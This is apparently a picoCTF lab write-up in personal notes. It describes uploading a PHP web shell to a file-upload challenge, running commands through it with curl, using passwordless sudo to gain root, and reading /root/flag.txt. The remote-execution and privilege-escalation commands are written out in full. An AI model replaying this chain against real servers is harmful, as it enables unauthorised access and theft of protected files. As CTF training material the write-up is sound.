![[Pasted image 20250312235024.png]]


### 1. **Upload a Web Shell (`sh3.php`)**

You started by uploading a PHP web shell (`sh3.php`) to the vulnerable server. This was possible because the server allowed file uploads.

**Example URL for uploading:**
![[Pasted image 20250312235118.png]]

`http://standard-pizzas.picoctf.net:54343/uploads/sh3.php`

### 2. **Execute Commands via Web Shell**

Using the uploaded PHP shell, you executed commands on the server by passing them as parameters through the URL. The shell executed commands like `id`, which showed the user under which the web server is running (`www-data`).

For example, you ran:

`curl "http://standard-pizzas.picoctf.net:54343/uploads/sh3.php?cmd=id"`

### 3. **Discover the Sudo Privileges**

Next, you discovered that the web server user (`www-data`) had **sudo privileges without a password**. This was key to escalating your privileges.

You found out that the `www-data` user can run **any command as root without a password**:


`curl "http://standard-pizzas.picoctf.net:54343/uploads/sh3.php?cmd=sudo+-l"`

This revealed the line:  
`(ALL) NOPASSWD: ALL`

### 4. **Gain Root Privileges**

Using the `sudo` command, you could run any command as root without needing a password. This allowed you to **access files that are restricted** to normal users.

You executed the following command to read the flag:

bash



CopyEdit

`curl "http://standard-pizzas.picoctf.net:54343/uploads/sh3.php?cmd=sudo%20cat%20/root/flag.txt"`

This returned the contents of `/root/flag.txt`, which is the flag!

### 5. **Alternative Method (Move Flag to Web-Accessible Directory)**

If `cat` didn’t work or you wanted to make the flag easier to access, you could move the flag to a directory that is accessible via a browser. Here's how you would do that:

bash

CopyEdit

`curl "http://standard-pizzas.picoctf.net:54343/uploads/sh3.php?cmd=sudo%20cp%20/root/flag.txt%20/var/www/html/flag.txt"`

Then you can open the following URL to see the flag:

bash

CopyEdit

`http://standard-pizzas.picoctf.net:54343/flag.txt`

### Summary of Commands:

1. **Upload the shell**:
    - Upload the PHP shell via the web application.
2. **Execute basic commands**:
    - `curl "http://<server>/uploads/sh3.php?cmd=id"`
    - `curl "http://<server>/uploads/sh3.php?cmd=sudo+-l"`
3. **Access the flag**:
    - `curl "http://<server>/uploads/sh3.php?cmd=sudo%20cat%20/root/flag.txt"`
    - Or move the flag:  
        `curl "http://<server>/uploads/sh3.php?cmd=sudo%20cp%20/root/flag.txt%20/var/www/html/flag.txt"`

![[Pasted image 20250308110558.png]]
